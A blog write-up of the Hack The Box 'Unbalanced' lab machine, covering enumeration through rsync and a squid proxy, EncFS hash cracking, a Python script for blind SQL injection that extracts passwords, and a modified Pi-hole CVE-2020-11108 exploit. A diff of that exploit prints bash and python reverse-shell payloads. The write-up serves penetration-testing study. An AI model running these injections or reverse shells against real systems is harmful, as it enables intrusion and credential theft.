Title: HTB Unbalanced box writeup
Tags: oscp, htb
Summary: Merciless intranet enumeration and unusual privesc service
Date: 2020-12-21 23:00
Status: published

# Enumeration
As usual starting with brief sS scan:
```text
# Nmap 7.80 scan initiated Tue Nov 24 21:59:47 2020 as: nmap -sS -p- -v -oA enum/nmap-ss-all 10.10.10.200
Nmap scan report for unbalanced.htb (10.10.10.200)
Host is up (0.052s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
873/tcp  open  rsync
3128/tcp open  squid-http

Read data files from: /usr/bin/../share/nmap
# Nmap done at Tue Nov 24 22:00:49 2020 -- 1 IP address (1 host up) scanned in 62.22 seconds
```
Following with scripted scan:
```text
# Nmap 7.80 scan initiated Tue Nov 24 22:01:18 2020 as: nmap -sC -A -T4 -sV -p22,873,3128 -oA enum/nmap-sCVAT4-open 10.10.10.200
Nmap scan report for unbalanced.htb (10.10.10.200)
Host is up (0.052s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA)
|   256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA)
|_  256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519)
873/tcp  open  rsync      (protocol version 31)
3128/tcp open  http-proxy Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.5 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   51.43 ms 10.10.14.1
2   52.54 ms unbalanced.htb (10.10.10.200)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov 24 22:01:37 2020 -- 1 IP address (1 host up) scanned in 19.52 seconds
```
rsync and squid - somewhat unusual couple. There's indeed a page that looks like
squid:

![squid](/cstatic/htb-unbalanced/squid.png)

Can list remote files via rsync:
```text
kali@kali:~/src/htb/active/Unbalanced$ rsync -av --list-only rsync://10.10.10.200/
conf_backups    EncFS-encrypted configuration backups
```
Even can sync:
```text
kali@kali:~/src/htb/active/Unbalanced/enum$ rsync -av rsync://10.10.10.200/conf_backups ./rsync/
receiving incremental file list
./
,CBjPJW4EGlcqwZW4nmVqBA6
-FjZ6-6,Fa,tMvlDsuVAO7ek
.encfs6.xml
0K72OfkNRRx3-f0Y6eQKwnjn
27FonaNT2gnNc3voXuKWgEFP4sE9mxg0OZ96NB0x4OcLo-
<SNIP>
```
There's some EFS encrypted storage:
```xml
kali@kali:~/src/htb/active/Unbalanced/enum/rsync$ cat .encfs6.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE boost_serialization>
<boost_serialization signature="serialization::archive" version="7">
    <cfg class_id="0" tracking_level="0" version="20">
        <version>20100713</version>
        <creator>EncFS 1.9.5</creator>
        <cipherAlg class_id="1" tracking_level="0" version="0">
            <name>ssl/aes</name>
            <major>3</major>
            <minor>0</minor>
        </cipherAlg>
        <nameAlg>
            <name>nameio/block</name>
            <major>4</major>
            <minor>0</minor>
        </nameAlg>
        <keySize>192</keySize>
        <blockSize>1024</blockSize>
        <plainData>0</plainData>
        <uniqueIV>1</uniqueIV>
        <chainedNameIV>1</chainedNameIV>
        <externalIVChaining>0</externalIVChaining>
        <blockMACBytes>0</blockMACBytes>
        <blockMACRandBytes>0</blockMACRandBytes>
        <allowHoles>1</allowHoles>
        <encodedKeySize>44</encodedKeySize>
        <encodedKeyData>
GypYDeps2hrt2W0LcvQ94TKyOfUcIkhSAw3+iJLaLK0yntwAaBWj6EuIet0=
</encodedKeyData>
        <saltLen>20</saltLen>
        <saltData>
mRdqbk2WwLMrrZ1P6z2OQlFl8QU=
</saltData>
        <kdfIterations>580280</kdfIterations>
        <desiredKDFDuration>500</desiredKDFDuration>
    </cfg>
</boost_serialization>
```
Efficiently leaks EFS version, might come in handy. 
Extracting hash to crack:
```text
kali@kali:~/src/htb/active/Unbalanced/enum$ python2 /usr/share/john/encfs2john.py rsync/
rsync/:$encfs$192*580280*0*20*99176a6e4d96c0b32bad9d4feb3d8e425165f105*44*1b2a580dea6cda1aedd96d0b72f43de132b239f51c224852030dfe8892da2cad329edc006815a3e84b887add
```
Cracked with default john wordlist:
```text
kali@kali:~/src/htb/active/Unbalanced/enum$ john --show encfs.hash 
rsync/:bubblegum
```

Installed encfs, mounted it with 
`sudo encfs /home/kali/src/htb/active/Unbalanced/enum/rsync/ /mnt/test/`
Directory listing:
```text
total 628
drwxr-xr-x 2 kali kali   4096 Nov 25 11:05 .
drwxr-xr-x 6 root root   4096 Aug  8 09:55 ..
-rw-r--r-- 1 kali kali    267 Apr  4  2020 50-localauthority.conf
-rw-r--r-- 1 kali kali    455 Apr  4  2020 50-nullbackend.conf
-rw-r--r-- 1 kali kali     48 Apr  4  2020 51-debian-sudo.conf
-rw-r--r-- 1 kali kali    182 Apr  4  2020 70debconf
-rw-r--r-- 1 kali kali   2351 Apr  4  2020 99-sysctl.conf
-rw-r--r-- 1 kali kali   4564 Apr  4  2020 access.conf
-rw-r--r-- 1 kali kali   2981 Apr  4  2020 adduser.conf
-rw-r--r-- 1 kali kali   1456 Apr  4  2020 bluetooth.conf
-rw-r--r-- 1 kali kali   5713 Apr  4  2020 ca-certificates.conf
-rw-r--r-- 1 kali kali    662 Apr  4  2020 com.ubuntu.SoftwareProperties.conf
-rw-r--r-- 1 kali kali    246 Apr  4  2020 dconf
-rw-r--r-- 1 kali kali   2969 Apr  4  2020 debconf.conf
-rw-r--r-- 1 kali kali    230 Apr  4  2020 debian.conf
-rw-r--r-- 1 kali kali    604 Apr  4  2020 deluser.conf
-rw-r--r-- 1 kali kali   1735 Apr  4  2020 dhclient.conf
-rw-r--r-- 1 kali kali    346 Apr  4  2020 discover-modprobe.conf
-rw-r--r-- 1 kali kali    127 Apr  4  2020 dkms.conf
-rw-r--r-- 1 kali kali     21 Apr  4  2020 dns.conf
-rw-r--r-- 1 kali kali    652 Apr  4  2020 dnsmasq.conf
-rw-r--r-- 1 kali kali   1875 Apr  4  2020 docker.conf
-rw-r--r-- 1 kali kali     38 Apr  4  2020 fakeroot-x86_64-linux-gnu.conf
-rw-r--r-- 1 kali kali    906 Apr  4  2020 framework.conf
-rw-r--r-- 1 kali kali    280 Apr  4  2020 fuse.conf
-rw-r--r-- 1 kali kali   2584 Apr  4  2020 gai.conf
-rw-r--r-- 1 kali kali   3635 Apr  4  2020 group.conf
-rw-r--r-- 1 kali kali   5060 Apr  4  2020 hdparm.conf
-rw-r--r-- 1 kali kali      9 Apr  4  2020 host.conf
-rw-r--r-- 1 kali kali   1269 Apr  4  2020 initramfs.conf
-rw-r--r-- 1 kali kali    927 Apr  4  2020 input.conf
-rw-r--r-- 1 kali kali   1042 Apr  4  2020 journald.conf
-rw-r--r-- 1 kali kali    144 Apr  4  2020 kernel-img.conf
-rw-r--r-- 1 kali kali    332 Apr  4  2020 ldap.conf
-rw-r--r-- 1 kali kali     34 Apr  4  2020 ld.so.conf
-rw-r--r-- 1 kali kali    191 Apr  4  2020 libaudit.conf
-rw-r--r-- 1 kali kali     44 Apr  4  2020 libc.conf
-rw-r--r-- 1 kali kali   2161 Apr  4  2020 limits.conf
-rw-r--r-- 1 kali kali    150 Apr  4  2020 listchanges.conf
-rw-r--r-- 1 kali kali   1042 Apr  4  2020 logind.conf
-rw-r--r-- 1 kali kali    435 Apr  4  2020 logrotate.conf
-rw-r--r-- 1 kali kali   4491 Apr  4  2020 main.conf
-rw-r--r-- 1 kali kali    812 Apr  4  2020 mke2fs.conf
-rw-r--r-- 1 kali kali    195 Apr  4  2020 modules.conf
-rw-r--r-- 1 kali kali   1440 Apr  4  2020 namespace.conf
-rw-r--r-- 1 kali kali    120 Apr  4  2020 network.conf
-rw-r--r-- 1 kali kali    529 Apr  4  2020 networkd.conf
-rw-r--r-- 1 kali kali    510 Apr  4  2020 nsswitch.conf
-rw-r--r-- 1 kali kali   1331 Apr  4  2020 org.freedesktop.PackageKit.conf
-rw-r--r-- 1 kali kali    706 Apr  4  2020 PackageKit.conf
-rw-r--r-- 1 kali kali    552 Apr  4  2020 pam.conf
-rw-r--r-- 1 kali kali   2972 Apr  4  2020 pam_env.conf
-rw-r--r-- 1 kali kali   1583 Apr  4  2020 parser.conf
-rw-r--r-- 1 kali kali    324 Apr  4  2020 protect-links.conf
-rw-r--r-- 1 kali kali   3267 Apr  4  2020 reportbug.conf
-rw-r--r-- 1 kali kali     87 Apr  4  2020 resolv.conf
-rw-r--r-- 1 kali kali    649 Apr  4  2020 resolved.conf
-rw-r--r-- 1 kali kali    146 Apr  4  2020 rsyncd.conf
-rw-r--r-- 1 kali kali   1988 Apr  4  2020 rsyslog.conf
-rw-r--r-- 1 kali kali   2041 Apr  4  2020 semanage.conf
-rw-r--r-- 1 kali kali    419 Apr  4  2020 sepermit.conf
-rw-r--r-- 1 kali kali    790 Apr  4  2020 sleep.conf
-rw-r--r-- 1 kali kali 316553 Apr  4  2020 squid.conf
-rw-r--r-- 1 kali kali   2351 Apr  4  2020 sysctl.conf
-rw-r--r-- 1 kali kali   1628 Apr  4  2020 system.conf
-rw-r--r-- 1 kali kali   2179 Apr  4  2020 time.conf
-rw-r--r-- 1 kali kali    677 Apr  4  2020 timesyncd.conf
-rw-r--r-- 1 kali kali   1260 Apr  4  2020 ucf.conf
-rw-r--r-- 1 kali kali    281 Apr  4  2020 udev.conf
-rw-r--r-- 1 kali kali    378 Apr  4  2020 update-initramfs.conf
-rw-r--r-- 1 kali kali   1130 Apr  4  2020 user.conf
-rw-r--r-- 1 kali kali    414 Apr  4  2020 user-dirs.conf
-rw-r--r-- 1 kali kali   1889 Apr  4  2020 Vendor.conf
-rw-r--r-- 1 kali kali   1513 Apr  4  2020 wpa_supplicant.conf
-rw-r--r-- 1 kali kali    100 Apr  4  2020 x86_64-linux-gnu.conf
-rw-r--r-- 1 kali kali    642 Apr  4  2020 xattr.conf
```
Noticed some password:
```text
root@kali:/mnt/test# grep ^cachemgr_ squid.conf 
cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events
cachemgr_passwd disable all
```
Not sure whether this is useful (turned out this is a slight hint to privesc):
```text
root@kali:/mnt/test# cat resolv.conf 
domain homenet.telecomitalia.it
search homenet.telecomitalia.it
nameserver 192.168.1.1
```
Some juicy info left unnoticed at first:
```text
root@kali:/mnt/test# grep -v '^$\|^#' squid.conf
acl localnet src 0.0.0.1-0.255.255.255  # RFC 1122 "this" network (LAN)
acl localnet src 10.0.0.0/8             # RFC 1918 local private network (LAN)
acl localnet src 100.64.0.0/10          # RFC 6598 shared address space (CGN)
acl localnet src 169.254.0.0/16         # RFC 3927 link-local (directly plugged) machines
acl localnet src 172.16.0.0/12          # RFC 1918 local private network (LAN)
acl localnet src 192.168.0.0/16         # RFC 1918 local private network (LAN)
acl localnet src fc00::/7               # RFC 4193 local private network range
acl localnet src fe80::/10              # RFC 4291 link-local (directly plugged) machines
acl SSL_ports port 443
acl Safe_ports port 80          # http
acl Safe_ports port 21          # ftp
acl Safe_ports port 443         # https
acl Safe_ports port 70          # gopher
acl Safe_ports port 210         # wais
acl Safe_ports port 1025-65535  # unregistered ports
acl Safe_ports port 280         # http-mgmt
acl Safe_ports port 488         # gss-http
acl Safe_ports port 591         # filemaker
acl Safe_ports port 777         # multiling http
acl CONNECT method CONNECT
http_access deny !Safe_ports
http_access deny CONNECT !SSL_ports
http_access allow manager
include /etc/squid/conf.d/*
http_access allow localhost
acl intranet dstdomain -n intranet.unbalanced.htb
acl intranet_net dst -n 172.16.0.0/12
http_access allow intranet
http_access allow intranet_net
http_access deny all
http_port 3128
coredump_dir /var/spool/squid
refresh_pattern ^ftp:           1440    20%     10080
refresh_pattern ^gopher:        1440    0%      1440
refresh_pattern -i (/cgi-bin/|\?) 0     0%      0
refresh_pattern .               0       20%     4320
cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events
cachemgr_passwd disable all
cache disable
```
Notice `intranet.unbalanced.htb` and internal subnet is leaked.
This resource is available through the proxy on the box:

![intranet](/cstatic/htb-unbalanced/intranet.png)

Interesting `Intranet-Host` header value:

![host header](/cstatic/htb-unbalanced/host-header.png)

It varies, I've also seen `intranet-host2.unbalanced.htb`. Sounds consonant 
with the box name and the picture of it on htb.

Gobustered it via proxy:
```text
kali@kali:~/src/htb/active/Unbalanced$ gobuster dir -u http://intranet.unbalanced.htb/ -p http://10.10.10.200:3128 -w /usr/share/dirb/wordlists/big.txt -x php,txt,swp -o enum/gob-intranet-proxied-root-big-x.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://intranet.unbalanced.htb/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] Proxy:          http://10.10.10.200:3128
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,swp,php
[+] Timeout:        10s
===============================================================
2020/11/25 12:41:50 Starting gobuster
===============================================================
/css (Status: 301)
/index.php (Status: 302)
/intranet.php (Status: 200)
===============================================================
2020/11/25 12:50:18 Finished
===============================================================
```
Nothing looks unusual.

Nikto through proxy:
```text
kali@kali:~/src/htb/active/Unbalanced$ nikto -host http://intranet.unbalanced.htb/ -output enum/nikto-intranet-root-proxied.txt -useproxy http://10.10.10.200:3128                                
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          (proxied)
+ Target Hostname:    intranet.unbalanced.htb
+ Target Port:        80
+ Proxy:              10.10.10.200:3128
+ Start Time:         2020-11-25 12:46:22 (GMT0)
---------------------------------------------------------------------------
+ Server: nginx/1.14.0 (Ubuntu)
+ Retrieved via header: 1.1 unbalanced (squid/4.6)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-cache' found, with contents: MISS from unbalanced
+ Uncommon header 'x-cache-lookup' found, with contents: MISS from unbalanced:3128
+ Uncommon header 'intranet-host' found, with contents: intranet-host2.unbalanced.htb
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Root page / redirects to: intranet.php

+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server banner has changed from 'nginx/1.14.0 (Ubuntu)' to 'squid/4.6' which may suggest a WAF, load balancer or proxy is in place
+ Uncommon header 'x-squid-error' found, with contents: ERR_INVALID_URL 0
+ 7838 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2020-11-25 13:01:18 (GMT0) (896 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
Installed `squidclient`, can access some admin interfaces using acquired creds:
```text
root@kali:/mnt/test# squidclient -h 10.10.10.200 mgr:menu@'Thah$Sh1'
HTTP/1.1 200 OK
Server: squid/4.6
Mime-Version: 1.0
Date: Wed, 25 Nov 2020 14:47:14 GMT
Content-Type: text/plain;charset=utf-8
Expires: Wed, 25 Nov 2020 14:47:14 GMT
Last-Modified: Wed, 25 Nov 2020 14:47:14 GMT
X-Cache: MISS from unbalanced
X-Cache-Lookup: MISS from unbalanced:3128
Via: 1.1 unbalanced (squid/4.6)
Connection: close

 index                 	Cache Manager Interface         	disabled
 menu                  	Cache Manager Menu              	protected
 offline_toggle        	Toggle offline_mode setting     	disabled
 shutdown              	Shut Down the Squid Process     	disabled
 reconfigure           	Reconfigure Squid               	disabled
 rotate                	Rotate Squid Logs               	disabled
 pconn                 	Persistent Connection Utilization Histograms	protected
 mem                   	Memory Utilization              	protected
 diskd                 	DISKD Stats                     	protected
 squidaio_counts       	Async IO Function Counters      	disabled
 config                	Current Squid Configuration     	disabled
 client_list           	Cache Client List               	disabled
 comm_epoll_incoming   	comm_incoming() stats           	disabled
 ipcache               	IP Cache Stats and Contents     	disabled
 fqdncache             	FQDN Cache Stats and Contents   	protected
 idns                  	Internal DNS Statistics         	disabled
 redirector            	URL Redirector Stats            	disabled
 store_id              	StoreId helper Stats            	disabled
 external_acl          	External ACL stats              	disabled
 http_headers          	HTTP Header Statistics          	disabled
 info                  	General Runtime Information     	disabled
 service_times         	Service Times (Percentiles)     	disabled
 filedescriptors       	Process Filedescriptor Allocation	protected
 objects               	All Cache Objects               	protected
 vm_objects            	In-Memory and In-Transit Objects	protected
 io                    	Server-side network read() size histograms	disabled
 counters              	Traffic and Resource Counters   	protected
 peer_select           	Peer Selection Algorithms       	disabled
 digest_stats          	Cache Digest and ICP blob       	disabled
 5min                  	5 Minute Average of Counters    	protected
 60min                 	60 Minute Average of Counters   	protected
 utilization           	Cache Utilization               	disabled
 histograms            	Full Histogram Counts           	protected
 active_requests       	Client-side Active Requests     	disabled
 username_cache        	Active Cached Usernames         	disabled
 openfd_objects        	Objects with Swapout files open 	disabled
 store_digest          	Store Digest                    	disabled
 store_log_tags        	Histogram of store.log tags     	disabled
 storedir              	Store Directory Stats           	disabled
 store_io              	Store IO Interface Stats        	disabled
 store_check_cachable_stats	storeCheckCachable() Stats      	disabled
 refresh               	Refresh Algorithm Statistics    	disabled
 delay                 	Delay Pool Levels               	disabled
 forward               	Request Forwarding Statistics   	disabled
 cbdata                	Callback Data Registry Contents 	protected
 sbuf                  	String-Buffer statistics        	protected
 events                	Event Queue                     	protected
 netdb                 	Network Measurement Database    	disabled
 asndb                 	AS Number Database              	disabled
 carp                  	CARP information                	disabled
 userhash              	peer userhash information       	disabled
 sourcehash            	peer sourcehash information     	disabled
 server_list           	Peer Cache Statistics           	disabled
```
This [article](https://developer.aliyun.com/article/447955) helped a lot.
`FQDNCache` revealed already known domains, but leaked IP addresses:
```text
root@kali:/mnt/test# squidclient -h 10.10.10.200 mgr:fqdncache@'Thah$Sh1'
<SNIP>
FQDN Cache Statistics:
FQDNcache Entries In Use: 9
FQDNcache Entries Cached: 9
FQDNcache Requests: 124844
FQDNcache Hits: 0
FQDNcache Negative Hits: 71882
FQDNcache Misses: 52962
FQDN Cache Contents:

Address                                  Flg TTL Cnt Hostnames
10.10.14.28                                N  016   0
127.0.1.1                                  H -001   2 unbalanced.htb unbalanced
::1                                        H -001   3 localhost ip6-localhost ip6-loopback
172.31.179.2                               H -001   1 intranet-host2.unbalanced.htb
172.31.179.3                               H -001   1 intranet-host3.unbalanced.htb
127.0.0.1                                  H -001   1 localhost
172.17.0.1                                 H -001   1 intranet.unbalanced.htb
ff02::1                                    H -001   1 ip6-allnodes
ff02::2                                    H -001   1 ip6-allrouters
```
Some resources were looking promising:
```text
root@kali:/mnt/test# squidclient -h 10.10.10.200 mgr:filedescriptors@'Thah$Sh1'
. . .
Active file descriptors:
File Type   Tout Nread  * Nwrite * Remote Address        Description
---- ------ ---- -------- -------- --------------------- ------------------------------
   5 Socket    0       0        0  [::]:56505            DNS Socket IPv6
   8 Log       0       0        0                        /var/log/squid/cache.log
   9 Socket    0       0  3334968  0.0.0.0:45428         DNS Socket IPv4
  10 Socket    0       0        0  [::]:3128             HTTP Socket
  11 Socket  900   28710*   41170  172.31.179.2:80       http://172.31.179.2/avcms.php
  12 Socket    0       0        0  ::1:33766             pinger
  13 Socket   60   12777*   17552  172.31.179.2:80       Idle server: 172.31.179.2:80/172.31.179.2
  14 Socket 86400  136685*  484367  10.10.14.28:34884     Reading next request
  15 Socket   60   18114*   25850  172.31.179.2:80       Idle server: 172.31.179.2:80/172.31.179.2
  16 Socket  120  136389*  484457  10.10.14.28:34888     Idle client: Waiting for next request
  17 Socket  120  136172*  484782  10.10.14.28:34890     Idle client: Waiting for next request
  18 Socket 86400  137470*  488947  10.10.14.28:34896     Reading next request
  19 Socket  900   15081*   21890  172.31.179.2:80       http://172.31.179.2/avantgo.swp
  20 Socket   60   17430*   24942  172.31.179.2:80       Idle server: 172.31.179.2:80/172.31.179.2
  21 Socket 86400  136715*  485799* 10.10.14.28:34892     Reading next request
  22 Socket   60    6066*    8704  172.31.179.2:80       Idle server: 172.31.179.2:80/172.31.179.2
  23 Socket  120  136362*  484581  10.10.14.28:34894     Idle client: Waiting for next request
  25 Socket 86400     151        0* 10.10.14.28:35872     Reading next request
  26 Socket 86400  136990*  486955* 10.10.14.28:34898     Reading next request
  27 Socket  120  136985*  486057  10.10.14.28:34904     Idle client: Waiting for next request
  28 Socket 86400  136772*  486524* 10.10.14.28:34900     Reading next request
  29 Socket 86400  137122*  487484* 10.10.14.28:34902     Reading next request
  30 Socket  231       0*       0  10.10.14.28:34906     client http connect
```
But turned out to be artifacts caused by the gobuster running in parallel.
First host found, looks like it hosts different version of the application:

![hidden host](/cstatic/htb-unbalanced/hidden-host.png)

It's index page differs and gives us some hope to serve as a way in:

![hidden host index](/cstatic/htb-unbalanced/hidden-host-index.png)

# Exploitation
After lots of tries and small hints proper SQLi string was found on this page:
`Username='+or+1=1+or+'&Password=`
Looks like being injected into the query int that manner:
`select * from users where Username='' or 1=1 or 'and Password='`
Allows to dump all the users:

![users](/cstatic/htb-unbalanced/users.png)

It also allows to enumerate user passwords:
`Username=bryan'+and+substring(Password,1,1)='a'+or+'&Password=1`.
Classic injection allows to retrieve passwords char-by-char. Made clunky
suboptimal script:
```python
#!/usr/bin/env python3
import requests
import string
import pprint


proxies = {
    'http': 'http://10.10.10.200:3128'
}

def main():
    passwords = {'rita': '', 'jim': '', 'bryan': '', 'sarah': ''}

    for name in passwords.keys():
        dname = '{}@unbalanced.htb'.format(name)
        print('[+] Trying: "{}"'.format(name))
        for i in range(1, 40):
            for c in string.printable:
                s = requests.Session()
                url = 'http://172.31.179.1/intranet.php'
                data = {
                    'Username': "{}' and substring(Password,{},1)='{}' or '".format(name, i, c),
                    'Password': "whateva"
                }
                req = requests.Request('POST', url, data=data)
                preq = s.prepare_request(req)
                res = s.send(preq, proxies=proxies)
                if dname in res.text:
                    passwords[name] += c
                    print('[+] {}: "{}"'.format(name, passwords[name]))

    print(passwords)

if __name__ == '__main__':
    main()
```
After a while it dumped all the passwords from web app (formatted):
```json 
{
    'rita': 'password01!',
    'jim': 'stairwaytoheaven',
    'bryan': 'ireallyl0vebubblegum!!!',
    'sarah': 'sarah4evah'
}
```
Bryan creds worked for ssh access:
```text
bryan@unbalanced:~$ whoami && id && hostname && ip a && cat user.txt
bryan                                         
uid=1000(bryan) gid=1000(bryan) groups=1000(bryan)
unbalanced          
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:87:c8 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.200/24 brd 10.10.10.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:87c8/64 scope global dynamic mngtmpaddr 
       valid_lft 86243sec preferred_lft 14243sec 
    inet6 fe80::250:56ff:feb9:87c8/64 scope link  
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:6c:e7:ab:f2 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-742fc4eb92b1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:55:52:36:a7 brd ff:ff:ff:ff:ff:ff
    inet 172.31.0.1/16 brd 172.31.255.255 scope global br-742fc4eb92b1
       valid_lft forever preferred_lft forever
    inet6 fe80::42:55ff:fe52:36a7/64 scope link  
       valid_lft forever preferred_lft forever
6: veth13e903a@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-742fc4eb92b1 state UP group default 
    link/ether 4e:63:3c:31:60:cf brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::4c63:3cff:fe31:60cf/64 scope link 
       valid_lft forever preferred_lft forever
8: veth9e0e3f4@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-742fc4eb92b1 state UP group default 
    link/ether ba:8f:ca:ae:4d:dd brd ff:ff:ff:ff:ff:ff link-netnsid 3
    inet6 fe80::b88f:caff:feae:4ddd/64 scope link 
       valid_lft forever preferred_lft forever
10: veth4976c56@if9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-742fc4eb92b1 state UP group default 
    link/ether 0e:2d:0e:99:92:f9 brd ff:ff:ff:ff:ff:ff link-netnsid 2
    inet6 fe80::c2d:eff:fe99:92f9/64 scope link  
       valid_lft forever preferred_lft forever
12: vethd121236@if11: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-742fc4eb92b1 state UP group default 
    link/ether 5e:66:88:ba:cb:f0 brd ff:ff:ff:ff:ff:ff link-netnsid 1
    inet6 fe80::5c66:88ff:feba:cbf0/64 scope link 
       valid_lft forever preferred_lft forever
8140c2<SNIP>
```

# Privilege escalation
Found a TODO file right in our home dir:
```text
bryan@unbalanced:~$ cat TODO 
############
# Intranet #
############
* Install new intranet-host3 docker [DONE]
* Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]
* Test intranet-host3 [DONE]
* Add intranet-host3 to load balancer [DONE]
* Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]
* Fix intranet-host2 [DONE]
* Re-add intranet-host2 to load balancer (set default weight) [DONE]
- Fix intranet-host1 [TODO]
- Re-add intranet-host1 to load balancer (set default weight) [TODO]

###########
# Pi-hole #
###########
* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]
* Set temporary admin password [DONE]
* Create Pi-hole configuration script [IN PROGRESS]
- Run Pi-hole configuration script [TODO]
- Expose Pi-hole ports to the network [TODO]
```
I was immediately suspecting recent RCE exploit in Pi-hole, heard of this since
I use it - CVE-2020-11108. There's indeed pi-hole running. I forwarded port
8080 via ssh control sequences and navigated to `/admin` path:

![pihole admin](/cstatic/htb-unbalanced/pihole.png)

Password `admin` worked great. Version seems to be vulnerable to the
mentioned RCE:

![pihole version](/cstatic/htb-unbalanced/pihole-ver.png)

So I grabbed some [exploit from EDB](https://www.exploit-db.com/exploits/48443)
and tuned it a bit, since box looked like lacking python3 (this was proven to
be true later). The exploit was changed so that reverse shell is sent using
bash:
```text
kali@kali:~/src/htb/active/Unbalanced/sploits$ diff mod-48443.py 48443.py 
34,37d33
< #shell_payload = """<?php
< #  shell_exec("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"%s\\\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);'")
< #?>
< #""" %(LOCAL_IP, LOCAL_PORT)
39c35
<     exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/%s/%s 0>&1'");
---
>   shell_exec("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"%s\\\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);'")
```
Shell popped, but we're in container:
```text
root@pihole:~# whoami && ip a && hostname
whoami && ip a && hostname
root
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
11: eth0@if12: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:1f:0b:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.31.11.3/16 brd 172.31.255.255 scope global eth0
       valid_lft forever preferred_lft forever
pihole.unbalanced.htb
```
Interesting creds in the script:
```text
root@pihole:~# cat pihole_config.sh
cat pihole_config.sh
#!/bin/bash

# Add domains to whitelist
/usr/local/bin/pihole -w unbalanced.htb
/usr/local/bin/pihole -w rebalanced.htb

# Set temperature unit to Celsius
/usr/local/bin/pihole -a -c

# Add local host record
/usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1

# Set privacy level
/usr/local/bin/pihole -a -l 4

# Set web admin interface password
/usr/local/bin/pihole -a -p 'bUbBl3gUm$43v3Ry0n3!'

# Set admin email
/usr/local/bin/pihole -a email admin@unbalanced.htb
```
Password worked for `su root` in bryan's session:
```text
root@unbalanced:~# whoami && id && ip a && hostname && cat root.txt
root                                                                                             
